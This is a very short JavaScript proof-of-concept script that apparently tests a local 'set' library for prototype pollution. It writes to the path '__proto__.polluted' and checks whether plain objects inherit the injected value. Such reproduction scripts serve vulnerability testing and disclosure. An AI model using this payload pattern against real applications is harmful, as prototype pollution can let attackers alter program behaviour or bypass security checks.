const set = require('../src');

console.log({}.polluted)
set("__proto__.polluted", {}, "Polluted!")
console.log({}.polluted)